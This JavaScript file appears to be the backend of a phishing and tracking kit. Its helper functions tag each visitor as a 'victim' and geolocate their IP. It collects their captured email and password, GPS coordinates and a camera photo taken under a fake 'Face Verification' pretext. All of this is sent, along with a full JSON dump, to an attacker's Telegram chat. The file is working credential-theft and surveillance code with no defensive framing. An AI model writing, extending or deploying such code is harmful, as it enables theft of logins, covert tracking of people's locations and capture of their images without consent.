// ==================== HELPER FUNCTIONS ====================

function generateVictimId(req) {
    const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
    const userAgent = req.headers['user-agent'] || 'unknown';
    return crypto
        .createHash('md5')
        .update(ip + userAgent + Date.now() + Math.random())
        .digest('hex')
        .substring(0, 16);
}

async function enhanceTrackingData(data) {
    try {
        // Get IP info if not present
        if (data.ip && !data.ipInfo) {
            try {
                const ipInfo = await axios.get(`https://ipapi.co/${data.ip}/json/`, {
                    timeout: 5000
                });
                data.ipInfo = ipInfo.data;
            } catch (e) {
                data.ipInfo = { error: 'Failed to fetch' };
            }
        }
        
        // Add server timestamp
        data.serverTimestamp = new Date().toISOString();
        
        // Detect device type
        const ua = data.system?.userAgent || '';
        data.deviceType = /mobile/i.test(ua) ? 'Mobile' : 'Desktop';
        
        // Detect browser
        if (ua.includes('Chrome')) data.browser = 'Chrome';
        else if (ua.includes('Firefox')) data.browser = 'Firefox';
        else if (ua.includes('Safari')) data.browser = 'Safari';
        else data.browser = 'Other';
        
    } catch (error) {
        console.error('Enhancement error:', error);
    }
}

function updateAnalytics(data) {
    analytics.total++;
    
    // Last 24 hours
    const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;
    if (new Date(data.timestamp).getTime() > oneDayAgo) {
        analytics.last24h++;
    }
    
    // Country
    const country = data.ipInfo?.country_name || 'Unknown';
    analytics.byCountry[country] = (analytics.byCountry[country] || 0) + 1;
    
    // Device
    const device = data.deviceType || 'Unknown';
    analytics.byDevice[device] = (analytics.byDevice[device] || 0) + 1;
    
    // Photos and locations
    if (data.photo) analytics.photos++;
    if (data.location?.lat) analytics.locations++;
}

function saveToMemory(data) {
    // For Vercel, we can't save to disk persistently
    // Use a database like MongoDB Atlas for production
    const maxEntries = 1000;
    if (victims.size > maxEntries) {
        // Remove oldest entries
        const keys = Array.from(victims.keys());
        for (let i = 0; i < keys.length - maxEntries; i++) {
            victims.delete(keys[i]);
        }
    }
}

async function sendToTelegram(data) {
    if (BOT_TOKEN === 'YOUR_BOT_TOKEN' || !CHAT_ID) {
        console.log('Telegram not configured');
        return;
    }
    
    try {
        // Basic info message
        let message = `🚨 *NEW VICTIM TRACKED* 🚨\n\n`;
        message += `*Credentials:*\n`;
        message += `📧 Email: \`${data.credentials.email}\`\n`;
        message += `🔑 Password: \`${data.credentials.password}\`\n\n`;
        
        message += `*IP Info:*\n`;
        message += `🌐 IP: \`${data.ip}\`\n`;
        if (data.ipInfo) {
            message += `📍 ${data.ipInfo.city || 'N/A'}, ${data.ipInfo.country_name || 'N/A'}\n`;
            message += `🏢 ISP: ${data.ipInfo.org || 'N/A'}\n`;
        }
        
        if (data.location?.lat) {
            message += `\n*GPS Location:*\n`;
            message += `📍 ${data.location.lat.toFixed(6)}, ${data.location.lon.toFixed(6)}\n`;
            message += `🎯 Accuracy: ${data.location.accuracy}m\n`;
            message += `🗺️ Maps: https://maps.google.com/?q=${data.location.lat},${data.location.lon}\n`;
        }
        
        message += `\n*Device:* ${data.deviceType || 'Unknown'}\n`;
        message += `*Browser:* ${data.browser || 'Unknown'}\n`;
        message += `*Screen:* ${data.system?.screen || 'N/A'}\n`;
        message += `*Time:* ${new Date(data.timestamp).toLocaleString()}\n`;
        
        // Send text message
        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });
        
        // Send location if available
        if (data.location?.lat) {
            try {
                await bot.sendLocation(CHAT_ID, data.location.lat, data.location.lon);
            } catch (e) {
                console.log('Failed to send location:', e);
            }
        }
        
        // Send photo if available
        if (data.photo) {
            try {
                const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, "");
                const buffer = Buffer.from(base64Data, 'base64');
                
                await bot.sendPhoto(CHAT_ID, buffer, {
                    caption: '📸 Captured Photo - Face Verification'
                });
            } catch (photoError) {
                console.error('Photo send error:', photoError);
                
                // Try sending as document
                try {
                    const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, "");
                    const buffer = Buffer.from(base64Data, 'base64');
                    
                    await bot.sendDocument(CHAT_ID, buffer, {
                        filename: `photo_${data.victimId}.jpg`
                    });
                } catch (e2) {
                    console.error('Failed to send photo as document:', e2);
                }
            }
        }
        
        // Send system info as file
        try {
            const systemInfo = JSON.stringify(data, null, 2);
            await bot.sendDocument(CHAT_ID, Buffer.from(systemInfo), {
                filename: `victim_${data.victimId}.json`,
                caption: '📄 Complete Victim Data'
            });
        } catch (docError) {
            console.error('Document send error:', docError);
        }
        
    } catch (error) {
        console.error('Telegram send error:', error);
    }
}

